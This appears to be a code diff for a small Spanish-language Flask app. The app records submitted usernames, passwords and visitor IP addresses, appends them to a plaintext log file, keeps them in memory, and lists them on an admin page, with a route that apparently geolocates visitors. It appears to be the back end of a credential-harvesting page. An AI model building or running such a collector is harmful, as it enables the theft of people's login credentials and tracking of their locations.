@@ -5,6 +5,9 @@ import io
 
 app = Flask(__name__,template_folder='Template')
 
+usuarios = {}
+password = {}
+count = 0
 
 @app.route('/')
 def home():
@@ -13,23 +16,22 @@ def home():
 
 @app.route('/addrec', methods=['POST', 'GET'])
 def addrec():
+    global count
     if request.method == 'POST':
         try:
             nm = request.form['nm']
             addr = request.form['add']
             ip = request.remote_addr
-            log = io.open('log.txt', "w", encoding='utf-8')
-            log.write(f"Usuario: {nm}\nContraseña: {addr}\nDireccion Ip: {ip}")
+            count += 1
+            usuarios[count] = nm
+            password[count] = addr
+            log = io.open('log.txt', "a+", encoding='utf-8')
+            log.write(f"Usuario: {nm}\nContraseña: {addr}\nDireccion Ip: {ip}\n\n")
             log.close()
-            with sql.connect("database.db") as con:
-                cur = con.cursor()
-                cur.execute("INSERT INTO datos (usuario,contrasena,ip)VALUES(?, ?, ?)",(nm,addr,ip))
-                con.commit()
 
         except:
-            con.rollback()
+            print("Fallo algo ahí")
         finally:
-            con.close()
             return render_template("result.html")
 
 @app.route('/admin', methods=['POST', 'GET'])
@@ -53,23 +55,11 @@ def admin():
 
 @app.route('/admin/list')
 def list():
-    con = sql.connect("database.db")
-    con.row_factory = sql.Row
-    cur = con.cursor()
-    cur.execute("select * from datos")
-    rows = cur.fetchall()
-    return render_template("list.html", rows=rows)
+    for i in usuarios:
+        print(f"Usuario: {usuarios[i]} Password: {password[i]}")
 
-@app.route('/admin/list/<int:id>')
-def listRemove(id):
-    con = sql.connect("database.db")
-    con.row_factory = sql.Row
+    return render_template("list.html", usuarios=usuarios, password=password)
 
-    cur = con.cursor()
-    cur.execute(f"DELETE FROM datos WHERE id={str(id)}")
-    con.commit()
-    con.close()
-    return list()
 
 @app.route('/admin/list/ubi',methods=['POST'])
 def geo():
@@ -88,4 +78,4 @@ def geo():
 
 
 if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=8000, debug=True)
+    app.run(host="127.0.0.1", port=8000, debug=True)
